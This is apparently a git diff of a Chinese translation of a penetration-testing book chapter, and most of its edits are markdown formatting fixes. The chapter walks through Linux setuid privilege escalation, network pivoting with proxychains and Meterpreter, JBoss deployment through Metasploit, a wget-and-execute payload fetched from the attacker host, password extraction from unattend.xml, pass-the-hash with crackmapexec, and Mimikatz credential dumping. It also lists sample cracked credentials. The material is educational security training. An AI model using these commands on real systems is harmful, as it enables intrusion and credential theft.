@@ -93,7 +93,7 @@ target    prot opt source destination
 
 有时候，如果运气好的话，用来获取 shell 的漏洞组件本身就以最高权限在运行，在这种情况下，确实什么都不用做，可以直接跳转到下一节了。
 
-一个典型的例子，运行 DBA 账户的 MSSQL 服务器存在 SQL 注入漏洞。所有通过**xp_commandshell** 执行的命令，都具备系统最高权限，也就没必要使用接下来介绍的这些技术了。不管怎样，我们还是聚焦在已经拿下的这台Linux服务器吧。
+一个典型的例子，运行 DBA 账户的 MSSQL 服务器存在 SQL 注入漏洞。所有通过**xp\_commandshell** 执行的命令，都具备系统最高权限，也就没必要使用接下来介绍的这些技术了。不管怎样，我们还是聚焦在已经拿下的这台Linux服务器吧。
 
 提权和 **setuid** 文件也不是每次都能碰到，但在linux的世界里，他们是一对完美组合。这是每一位黑客或者渗透测试人员攻击 Linux 服务器的第一反应。
 
@@ -109,9 +109,9 @@ r-sr-sr-x 1 oinstall adm 9 Dec 18 14:11 /app/product/def_policy
 […]
 ```
 
-找到了 **def_policy** 文件。任意用户都可以用 **oinstall** 账户的权限来执行该文件。也许该用户不具备 root 权限，但我们毕竟向前了一步。
+找到了 **def\_policy** 文件。任意用户都可以用 **oinstall** 账户的权限来执行该文件。也许该用户不具备 root 权限，但我们毕竟向前了一步。
 
-对 **def_policy** 文件执行 strings 命令，查找程序中硬编码的数据：
+对 **def\_policy** 文件执行 strings 命令，查找程序中硬编码的数据：
 
 ```text
 www-data@career$ strings /app/product/def_policy
@@ -132,7 +132,7 @@ ADMIN_PATH
 %s/install.sh
 ```
 
-看起来，**def\_policy** 程序只是一个简单的打包程序，用来执行 install.sh 脚本。'%s' 格式字符串意味着 **install.sh** 脚本的路径是从变量中获取的……比如'ADMIN_PATH'？也许吧，但是看起来程序代码中没有任何路径。基本可以确定，是在会话级别的环境变量中定义了该路径值。
+看起来，**def\_policy** 程序只是一个简单的打包程序，用来执行 install.sh 脚本。'%s' 格式字符串意味着 **install.sh** 脚本的路径是从变量中获取的……比如'ADMIN\_PATH'？也许吧，但是看起来程序代码中没有任何路径。基本可以确定，是在会话级别的环境变量中定义了该路径值。
 
 有意思的是，每个用户可以控制自己的环境变量。我们可以这样欺骗该程序去读取攻击者控制目录中的新 install.sh 脚本。这个新的“伪造”脚本会生成一个具有 oinstall 账户权限的bash会话。
 
@@ -154,11 +154,9 @@ uid=0(root) gid=0(root) groups=0(root)
 
 干掉了一个……继续干。
 
-> TIPS：
- 尝试linuxprivchecker 脚本，了解一些有趣的自动采集信息的技术：http://www.securitysift.com/download/linuxprivchecker.py 
+> TIPS： 尝试linuxprivchecker 脚本，了解一些有趣的自动采集信息的技术：[http://www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)
 >
-> windows 平台也有类似的工具：
-https://github.com/pentestmonkey/windows-privesc-check
+> windows 平台也有类似的工具： [https://github.com/pentestmonkey/windows-privesc-check](https://github.com/pentestmonkey/windows-privesc-check)
 
 ## 3.3 搭个梯子直达天堂
 
@@ -168,17 +166,16 @@ https://github.com/pentestmonkey/windows-privesc-check
 
 这就是为啥我倾向于第二种方法的原因，这种方法更“干净”，也可以说更“性感”：建立虚拟隧道。对 Linux 机器进行配置，让它接收我们所有的数据包，并且直接转发到指定的目标地址。这个目标地址从互联网是无法访问的，因为是私有地址。
 
-
-> **私有地址**
->设备在互联网上可以通过 IP 地址被访问。IPv4 由四个字节组成，通常用 X.X.X.X 表示， X 值介于 0 到 255。 有些 IP 地址被保留用于本地网络，不能用于互联网（RFC 1918）：
->```
->127.0.0.1 表示本机
->172.16.0.0/16 (从 172.16.0.0 到 172.16.31.255)
->192.168.0.0/24 （从 192.168.0.0 到 192.168.255.255）
->10.0.0.0/8 （从 10.0.0.0 到 10.255.255.255）
->```
->如果路由器在公网接口看到了以上地址，将会直接丢弃这些数据包。
-
+> **私有地址** 设备在互联网上可以通过 IP 地址被访问。IPv4 由四个字节组成，通常用 X.X.X.X 表示， X 值介于 0 到 255。 有些 IP 地址被保留用于本地网络，不能用于互联网（RFC 1918）：
+>
+> ```text
+> 127.0.0.1 表示本机
+> 172.16.0.0/16 (从 172.16.0.0 到 172.16.31.255)
+> 192.168.0.0/24 （从 192.168.0.0 到 192.168.255.255）
+> 10.0.0.0/8 （从 10.0.0.0 到 10.255.255.255）
+> ```
+>
+> 如果路由器在公网接口看到了以上地址，将会直接丢弃这些数据包。
 
 蓝色区域的服务器都位 192.168.1.0/24 网段。如果我们告诉 FrontGun 服务器向 192.168.1.56 发送一个数据包，互联网路由器显然会根据 RFC 1918 直接予以丢弃。
 
@@ -261,7 +258,6 @@ FrontGun$ proxychains nmap -sT 192.168.1.0/24
 
 > 提示： -sT 参数会强制 nmap 发起连接式扫描。否则流量不会经过代理链。
 
-
 ### 3.3.2 Meterpreter
 
 之前的 maneuver 依赖于 **iptables** 来创建本地转发规则，该工具仅适用于 root 用户。我们不可能一直都有这么高的权限，可能是因为时间不够、兴趣不够、或者缺少 exploit 等原因。
@@ -284,8 +280,10 @@ Msf> run
 ```text
 FrontGun$ python -m SimpleHTTPServer 80
 ```
+
 以下在蓝区的 Linux 服务器执行:
-```
+
+```text
 Career# wget http://FrontGun/package
 Career# chmod +x package && ./package
 ```
@@ -348,35 +346,27 @@ msf auxiliary(tcp)> run
 frontGun$ proxychains nmap -sT 192.168.1.0/24
 ```
 
-
-> **建议** 
-> 我们也可以使用 SSH 来转发所有端口，这篇博客中有详细介绍：https://highon.coffee/blog/ssh-meterpreter-pivoting-techniques/
-
+> **建议** 我们也可以使用 SSH 来转发所有端口，这篇博客中有详细介绍：[https://highon.coffee/blog/ssh-meterpreter-pivoting-techniques/](https://highon.coffee/blog/ssh-meterpreter-pivoting-techniques/)
 
 ## 3.4 四处晃晃
 
-当我们可以访问公共 DMZ 区的其他服务器之后，可以探索下该区域都有哪些服务和应用。当前位于 C 类网络中，可以轻易扫描整个网络范围（0-255)。在此，咱们先简单的探测下常用端口：
+当我们可以访问公共 DMZ 区的其他服务器之后，可以探索下该区域都有哪些服务和应用。当前位于 C 类网络中，可以轻易扫描整个网络范围（0-255\)。在此，咱们先简单的探测下常用端口：
 
 ```text
 FrontGun$ proxychains nmap -F -n 192.168.1.0/24 -oA dmz_scan
 ```
-> -n does not resolve DNS names
-> -F scans only the 100 most common ports
-> -oA writes the results to a local file
+
+> -n does not resolve DNS names -F scans only the 100 most common ports -oA writes the results to a local file
 
 通过扫描结果来寻找“软柿子”，也就是可以被轻松提权执行代码的目标。
 
-### 3.4.1 孤独的(J)Boss
+### 3.4.1 孤独的\(J\)Boss
 
 跟预期的一样，该区域看起来有大量的 web 服务。大部分通过浏览互联网就能访问到；但是，我们终究是在**公网**。有些服务在先前的互联网扫描中并未被发现，这就是**中间件控制台**。
 
-
-> **何为中间件？** 
->中间件是一个组件，用来承载更高级别的应用，处理一些基本任务，例如排程、优先级、资源缓存、清理内存等等。Apache 就是一种承载网站的中间件。更精准的例子应该数 Java 中间件家族：JBoss、Tomcat、Jenkins等等。
+> **何为中间件？** 中间件是一个组件，用来承载更高级别的应用，处理一些基本任务，例如排程、优先级、资源缓存、清理内存等等。Apache 就是一种承载网站的中间件。更精准的例子应该数 Java 中间件家族：JBoss、Tomcat、Jenkins等等。
 >
 > 作为黑客，让我们感兴趣的是这些中间件都有管理控制台，供开发者用来发布新的应用和升级已有应用，例如 CMS（译注：内容管理系统）。如果我们可以控制中间件，就能发布新的应用，从而在服务器上执行任意代码。
-
-
 
 利用 **grep** 命令来查找 nmap 扫描结果中开放了 8080/8443/8081/8888 端口的服务器。这些可能通常对应 Jboss/Tomcat/Jenkins 等中间件。
 
@@ -402,7 +392,7 @@ Ports:
 
 要确保所有东西都锁好，势必是需要做额外功的，但是当人们搭建测试服务器之后，就懒得再遵照安全守则操作了。他们会等服务器运行6个月，就认为万事大吉了。到那个时候，谁都不会记得这个管理面板的存在，或者只是指望其他人做了安全加固。
 
-不管怎样，我们可以编写一个生成反弹 shell 的 Java 应用，打成**War**包，部署到 JBoss 服务器上，静静等到远程代码被执行。这一步操作也可以通过 metasploit 的**jboss_invoke_deply** 模块实现自动化：
+不管怎样，我们可以编写一个生成反弹 shell 的 Java 应用，打成**War**包，部署到 JBoss 服务器上，静静等到远程代码被执行。这一步操作也可以通过 metasploit 的**jboss\_invoke\_deply** 模块实现自动化：
 
 ```text
 FrontGun$ msfconsole
@@ -459,10 +449,7 @@ The command completed successfully.
 
 进一步探测可以发现，这是一台 windows 2003 sp3 服务器，有三个本地用户。你的第一反应肯定是：“操作系统太老了，我们有 N 种姿势来获取管理员权限！”说的很对，但我们不可能总是这么幸运，所以接下来我会介绍一些获取 windows 服务器的经典方法。这些方法更快、更隐蔽，而且，99%的情况下都有效。
 
-
-> **建议** 
-更懒的做法是，直接运行 /post/multi/recon/local\_exploit\_suggester 模块，来看看哪些方法适用于你的环境。
-
+> **建议** 更懒的做法是，直接运行 /post/multi/recon/local\_exploit\_suggester 模块，来看看哪些方法适用于你的环境。
 
 ### 3.4.2 跌宕起伏
 
@@ -479,7 +466,7 @@ PS> Get-Content "c:\windows\panther\unattend.xml" | Select-String "Password" -Co
 </Credentials>
 ```
 
-看到了吧！随便用哪种 base64 解码工具（PowerShell/Linux/web）就能获取到用户 **admin_svc** 的明文密码： 'Hello5me'。
+看到了吧！随便用哪种 base64 解码工具（PowerShell/Linux/web）就能获取到用户 **admin\_svc** 的明文密码： 'Hello5me'。
 
 看起来这一次我们拿到的本地用户隶属于管理员组：
 
@@ -494,9 +481,7 @@ Administrator
 The command completed successfully.
 ```
 
-> **建议** 
-sysprep.xml 和 sysprep.inf文件也有可能包含明文密码。
-
+> **建议** sysprep.xml 和 sysprep.inf文件也有可能包含明文密码。
 
 我们也可以在本地系统或者网络共享中查找常见脚本，例如.bat/.sh/.vbs/.vba/.vbe/.asp/.aspx/.php/.jsp等。配置文件也不要错过：例如 .ini/.config/.properties 等等。
 
@@ -522,11 +507,11 @@ sysprep.xml 和 sysprep.inf文件也有可能包含明文密码。
 
 psexec 是一款在远程计算机执行命令的常用工具。它需要远程计算机的管理员权限，所以 svc\_mnt 看起来是我们口袋中的第二个管理员账户。
 
-我们还要继续寻找其他方式来拿下其他Windows主机，但我们更倾向于提升已有账户的权限来获取更多访问权。（如果你对 windows 提权感兴趣，可以看看这篇精彩的文章：https://www.youtube.com/watch?v=_8xJaaQlpBo ）
+我们还要继续寻找其他方式来拿下其他Windows主机，但我们更倾向于提升已有账户的权限来获取更多访问权。（如果你对 windows 提权感兴趣，可以看看这篇精彩的文章：[https://www.youtube.com/watch?v=\_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo) ）
 
 ### 3.4.3 密码大丰收
 
-截止到目前，我们已经拿到了两个看起来非常有用的本地 Windows 账号： admin_svc 和 admin_mnt。为啥这么说？因为这些账号说不定能登录其他机器，那可省事儿了。那怎么找出哪些机器使用了这两个账号呢？太简单了：尝试连接每一台机器，看这两个账号是否能登录成功。
+截止到目前，我们已经拿到了两个看起来非常有用的本地 Windows 账号： admin\_svc 和 admin\_mnt。为啥这么说？因为这些账号说不定能登录其他机器，那可省事儿了。那怎么找出哪些机器使用了这两个账号呢？太简单了：尝试连接每一台机器，看这两个账号是否能登录成功。
 
 推荐使用 Crackmapexec，这个工具组合使用了 WMI 调用（Windows Management Instrumentation）和 SMB 请求来与远程机器交互。
 
@@ -541,7 +526,7 @@ FrontGun$ proxychains crackmapexec -u admin_svc -p Hello5me -d WORKGROUP 192.168
 
 ![&#x5BC6;&#x7801;&#x7206;&#x7834;](.gitbook/assets/3.4-3.png)
 
-看起我们拿到的身份信息只对刚才干掉的 Win2003 设备(192.168.1.70)有效啊。有时候管理员会根据 Windows系统的版本来设置不同的密码，不过也可能是因为管理员不同。
+看起我们拿到的身份信息只对刚才干掉的 Win2003 设备\(192.168.1.70\)有效啊。有时候管理员会根据 Windows系统的版本来设置不同的密码，不过也可能是因为管理员不同。
 
 在使用第二个账号开始爆破之前，先提取这台Windows 2003服务器的本地管理员账号的密码hash。使用这个账号说不定会有更大的收获：
 
@@ -551,47 +536,43 @@ FrontGun$ proxychains crackmapexec -u admin_svc -p Hello5me -d WORKGROUP –-sam
 
 ![&#x63D0;&#x53D6;&#x5BC6;&#x7801;hash](.gitbook/assets/3.4-4.png)
 
- 选项"--sam"用来分析注册表中的 SYSTEM 和 SAM 键值，里面存储了本地用户密码的hash值。
+选项"--sam"用来分析注册表中的 SYSTEM 和 SAM 键值，里面存储了本地用户密码的hash值。
 
 接下来破解这些 hash 值，不过在 windows 环境下可以跳过这一步。因为在windows系统里，拿到hash等同于拿到了明文密码，这一切得感谢 NTLM 协议。
 
-> **LM/NTLM 协议介绍** 
->NTLM 是windows的协议集，也可以指 hash 算法和 挑战-响应 协议。咱们先来讨论 Windows 中的hash。
+> **LM/NTLM 协议介绍** NTLM 是windows的协议集，也可以指 hash 算法和 挑战-响应 协议。咱们先来讨论 Windows 中的hash。
 >
 > Windows 系统的密码，由于历史缘故以两种格式存储：LM和NTLM格式（User:LM:NTLM）。
 >
->LM 哈希基于 DES 算法，所以比 NTLM 弱。此外，它还有很多设计缺陷，导致很容易被破解（例如密码长度不能超过14个字符，只支持大写，不含salt值等等）。
+> LM 哈希基于 DES 算法，所以比 NTLM 弱。此外，它还有很多设计缺陷，导致很容易被破解（例如密码长度不能超过14个字符，只支持大写，不含salt值等等）。
 >
->NTLM 哈希是对 MD4 算法的封装，应用在密码的 Unicode 值上，长度128位。虽然计算起来快，但只要资源合适，被破解起来也快。
+> NTLM 哈希是对 MD4 算法的封装，应用在密码的 Unicode 值上，长度128位。虽然计算起来快，但只要资源合适，被破解起来也快。
 >
->在理想化的登录场景下，例如用户坐在电脑前敲密码，Windows 系统根据其输入来计算密码 hash，然后与存储的值进行比较。很简单是不是？但是当服务器位于网络中时，微软依赖 挑战-响应 协议来对用户进行认证，大致过程如下：
+> 在理想化的登录场景下，例如用户坐在电脑前敲密码，Windows 系统根据其输入来计算密码 hash，然后与存储的值进行比较。很简单是不是？但是当服务器位于网络中时，微软依赖 挑战-响应 协议来对用户进行认证，大致过程如下：
 >
->服务器向客户端发送一个challenge包：客户端使用用户密码哈希对一个随机数进行加密，然后发送回服务端。后者知道用户的哈希值，可以进行同样的计算。如果两者计算结果相同，服务器就可以确认用户身份。
+> 服务器向客户端发送一个challenge包：客户端使用用户密码哈希对一个随机数进行加密，然后发送回服务端。后者知道用户的哈希值，可以进行同样的计算。如果两者计算结果相同，服务器就可以确认用户身份。
 >
->你可能已经主导了，客户端是使用的哈希值来响应挑战包，而不是原始密码。因此，攻击者即使不知道密码也可以伪造任意用户。
+> 你可能已经主导了，客户端是使用的哈希值来响应挑战包，而不是原始密码。因此，攻击者即使不知道密码也可以伪造任意用户。
 >
->随后微软实现了 Kerberos 协议来修补该缺陷，但是企业已经很难替换掉 NTLM 了。因为企业无法在不打破整个 windows 架构的情况下禁用该协议。
-
+> 随后微软实现了 Kerberos 协议来修补该缺陷，但是企业已经很难替换掉 NTLM 了。因为企业无法在不打破整个 windows 架构的情况下禁用该协议。
 
 因为我们已经拿到了管理员账号的 NTLM 哈希值，就可以利用 CME 登录所有 windows 服务器：
 
 ```text
 FrongGun$ proxychains crackmapexec -u administrator -H 9587e26af9d37a3bc45f08f2aa577a69 192.168.1.70, 192.168.1.88, 192.168.1.116 -d WORKGROUP
 ```
+
 ![&#x4F7F;&#x7528;&#x7BA1;&#x7406;&#x5458;hash&#x83B7;&#x53D6;&#x66F4;&#x591A;&#x4FE1;&#x606F;](.gitbook/assets/3.4-5.png)
 
 搞定了！现在我们可以无视操作系统版本，访问所有windows服务器了！接下来就可以在远程服务器上为所欲为了：如获取文件，监视用户，导出哈希等等。
 
 如果我告诉你咱们还能做得更好，你会不会很吃惊？其实，我们还可以在不使用爆破的情况下，获取所有windows服务器上最近连接用户的密码。这本身并非漏洞，而是一种设计缺陷。第一款能利用该缺陷的公开工具是 Mimikatz，它的出现，彻底改变了 Windows 渗透的世界。
 
-
-> **Mimikatz--windows魔法** 
->Gentilkiwi 开发了 Mimikatz 用来探索 Windows 认证机制的内部原理。他发现用户登录之后，其密码都保存在内存的“本地安全授权子系统服务”（简称 LSASS）进程中。通过利用 Windows 未公开的功能， Mimikatz 可以对密码解密并明文显示。
+> **Mimikatz--windows魔法** Gentilkiwi 开发了 Mimikatz 用来探索 Windows 认证机制的内部原理。他发现用户登录之后，其密码都保存在内存的“本地安全授权子系统服务”（简称 LSASS）进程中。通过利用 Windows 未公开的功能， Mimikatz 可以对密码解密并明文显示。
 >
->建议你读读Gentilkiwi的介绍文章，有讲到该缺陷的细节，不过最不可思议的是，这么多年过去了该方法居然还有效。
+> 建议你读读Gentilkiwi的介绍文章，有讲到该缺陷的细节，不过最不可思议的是，这么多年过去了该方法居然还有效。
 >
->Mimikatz提供了很多功能，使得它很快成为了 Windows 入侵和渗透的必备工具。后面我们将介绍它的部分功能。
-
+> Mimikatz提供了很多功能，使得它很快成为了 Windows 入侵和渗透的必备工具。后面我们将介绍它的部分功能。
 
 对此，你可能会有疑问，咱们会不会太冒险了？毕竟这个工具早就为人所知，所有的防病毒和防恶意软件产品都能识别其前五个字节特征。没错！但是别忘了一个简单的事实，所有防病毒产品只会分析落盘的文件。甭管这些厂家宣传的多牛x、先进，都逃不出这个简单的事实。
 
@@ -616,12 +597,7 @@ FrontGun$ proxychains crackmapexec -u administrator -H bc45f08f2aa577a69 -d WORK
 | 192.168.1.88 | Lionnel\_adm | Kiki\*\*081nb | WORKG |
 | All DMZ windows machines | Administrator | M4ster@dmin \_123 | WORKGR |
 
-
-> **补充说明** 
-以上所有对 CrackMapExec 和 Mimikatz 的演示都有个架设前提，就是 DMZ 区的 Windows 服务器可以访问我们的 Front Gun 服务器，两者之间能通过 80 端口进行通信，以发送密码。这个架设并非永远成立，后面我们还会提到。
-
-
-
-
+> **补充说明** 以上所有对 CrackMapExec 和 Mimikatz 的演示都有个架设前提，就是 DMZ 区的 Windows 服务器可以访问我们的 Front Gun 服务器，两者之间能通过 80 端口进行通信，以发送密码。这个架设并非永远成立，后面我们还会提到。
+>
 > 翻译：xncoder 2019/8/6
 
